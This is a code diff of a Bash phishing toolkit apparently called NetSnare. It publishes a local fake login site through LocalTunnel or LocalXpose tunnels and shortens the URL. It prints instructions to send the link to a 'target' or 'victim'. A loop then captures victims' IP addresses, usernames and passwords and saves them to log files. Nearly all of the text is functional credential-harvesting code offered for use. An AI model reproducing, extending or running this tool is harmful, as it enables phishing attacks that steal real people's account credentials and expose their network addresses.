+    datafound
+}
+
+start_localtunnel() {
+    printf "\n"
+    if ! command -v lt &> /dev/null; then
+        printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} LocalTunnel Not Installed${clear}\n"
+        exit 1
+    fi
+    cusport
+    printf "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Starting Local Web Server...${clear}\n"
+    { sleep 3; setup_site; }
+    printf "\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Creating LocalTunnel Link...${clear}\n"
+    sleep 5
+    url=$(lt --port 5555 --print-requests --log debug | grep -o 'https://.*$')
+    printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Shortening URL...${clear}\n"
+    sleep 3
+    short_url=$(curl -s -X POST -d "url=$url" https://tinyurl.com/api-create.php)
+    printf "${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Bypassing Tunnel Reminder...${clear}\n"
+    sleep 2
+    curl -H "bypass-tunnel-reminder: true" $url
+    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Shareable Link Ready${clear}\n"
+    sleep 3
+    if [[ -z "$url" ]]; then
+        echo -e "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Failed to Create Link${clear}\n"
+        exit 1
+    else
+        smallbanner
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Send to Target: ${BWhite}%s${clear}\n" $url
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Short URL: ${BWhite}%s${clear}\n" $short_url
         datafound
     fi
 }
 
 localxpose_auth() {
-	./.server/loclx -help >/dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
-
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
-		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token."
-			sleep 2
-			tunnel_menu
-		} || {
-			echo -n "$loclx_token" >$auth_f 2>/dev/null
-		}
-	}
+    ./.server/loclx -help >/dev/null 2>&1 &
+    sleep 1
+    [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
+    [ "$(./.server/loclx account status | grep Error)" ] && {
+        echo -e "\n\n${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Create an account at ${BHotPink}localxpose.io${AcidGreen} & copy token${clear}\n"
+        sleep 3
+        read -p "${NeonBlue}[${BWhite}>>${NeonBlue}]${AcidGreen} Input Loclx Token: ${clear}" loclx_token
+        [[ $loclx_token == "" ]] && {
+            echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} LocalXpose Token Required${clear}"
+            sleep 2
+            tunnel_menu
+        } || {
+            echo -n "$loclx_token" >$auth_f 2>/dev/null
+        }
+    }
 }
 
 start_loclx() {
-cusport
-echo -e "\n${RED} [${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{
-		sleep 2
-		setup_site
-		localxpose_auth
-	}
-	echo -e "\n"
-	read -n1 -p "${RED} [${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED} [${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
-
-	if [[ $(command -v termux-chroot) ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
-	#sleep 1 && ./.NetSnare/loclx.exe tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.NetSnare/.loclx-win 2>&1 &
+    cusport
+    echo -e "\n${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Initializing: ${BWhite}http://$HOST:$PORT${clear}"
+    { sleep 2; setup_site; localxpose_auth; }
+    echo -e "\n"
+    read -n1 -p "${NeonBlue}[${BWhite}?${NeonBlue}]${AcidGreen} Change Loclx Region? ${BNeonBlue}[${BWhite}y${BNeonBlue}/${BWhite}N${BNeonBlue}]: ${clear}" opinion
+    [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+    echo -e "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Launching LocalXpose Matrix...${clear}"
+    if [[ $(command -v termux-chroot) ]]; then
+        sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
     else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
-	fi
-
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-    if [ -z "$loclx_url" ]; then
-    echo -e "\n${RED} [${WHITE}-${RED}]${RED} Failed to create a link to send.\e[0m\n"
-    exit 1
-else
-    echo ""
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $loclx_url
-
-    datafound
-fi
-
+        sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
+    fi
+    sleep 12
+    loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+    if [[ -z "$loclx_url" ]]; then
+        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Failed to Create Link${clear}\n"
+        exit 1
+    else
+        echo ""
+        printf "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Send to Target: ${BWhite}%s${clear}\n" $loclx_url
+        datafound
+    fi
 }
 
-
 grab_ip() {
-
-ip=$(grep -a 'IP:' .NetSnare/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
-printf "\n"
-cat .NetSnare/www/ip.txt >> ip.txt
-
+    ip=$(grep -a 'IP:' .NetSnare/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    printf "\n${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Victim IP: ${BWhite}%s${clear}\n" $ip
+    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}ip.txt${clear}\n"
+    cat .NetSnare/www/ip.txt >> ip.txt
 }
 
 grab_creds() {
-
-account=$(grep -o 'Username:.*' .NetSnare/www/usernames.txt | cut -d " " -f2)
-IFS=$'\n'
-password=$(grep -o 'Pass:.*' .NetSnare/www/usernames.txt | cut -d ":" -f2)
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat .NetSnare/www/usernames.txt >> logs/$website.log
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;93m!\e[0m\e[1;31m]\e[0m\e[1;96m If you dont see account info, Go to the saved logs and use cat command to view it \e[0m\e[1;31m[\e[0m\e[1;93m!\e[0m\e[1;31m]\e[0m\n"
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
-
+    account=$(grep -o 'Username:.*' .NetSnare/www/usernames.txt | cut -d " " -f2)
+    IFS=$'\n'
+    password=$(grep -o 'Pass:.*' .NetSnare/www/usernames.txt | cut -d ":" -f2)
+    printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Account: ${BWhite}%s${clear}\n" $account
+    printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Password: ${BWhite}%s${clear}\n" $password
+    cat .NetSnare/www/usernames.txt >> logs/$website.log
+    printf "${NeonBlue}[${BWhite}💾${NeonBlue}]${AcidGreen} Saved: ${BWhite}logs/%s.log${clear}\n" $website
+    printf "${NeonBlue}[${BWhite}ℹ${NeonBlue}]${AcidGreen} Check logs/%s.log with cat command${clear}\n" $website
+    printf "${NeonBlue}[${BWhite}⏳${NeonBlue}]${AcidGreen} Awaiting Next Trap Data, Ctrl+C to Exit${clear}\n"
 }
 
 datafound() {
-
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
-printf "\n"
-while [ true ]; do
-if [[ -e ".NetSnare/www/ip.txt" ]]; then
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
-grab_ip
-rm -rf .NetSnare/www/ip.txt
-fi
-sleep 0.75
-if [[ -e ".NetSnare/www/usernames.txt" ]]; then
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
-grab_creds
-rm -rf .NetSnare/www/usernames.txt
-fi
-sleep 0.75
-done 
+    printf "\n${NeonBlue}[${BWhite}⏳${NeonBlue}]${AcidGreen} Awaiting Trap Data, Ctrl+C to Exit${clear}\n"
+    while [ true ]; do
+        if [[ -e ".NetSnare/www/ip.txt" ]]; then
+            printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Victim IP Captured${clear}\n"
+            grab_ip
+            rm -rf .NetSnare/www/ip.txt
+        fi
+        sleep 0.75
+        if [[ -e ".NetSnare/www/usernames.txt" ]]; then
+            printf "\n${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Login Data Captured${clear}\n"
+            grab_creds
+            rm -rf .NetSnare/www/usernames.txt
+        fi
+        sleep 0.75
+    done
 }
+
+stop() {
+    checkphp=$(ps aux | grep -o "php" | head -n1)
+    if [[ $checkphp == *'php'* ]]; then
+        pkill -f -2 php > /dev/null 2>&1
+        killall -2 php > /dev/null 2>&1
+    fi
+}
+
 clear
 banner
 dependencies
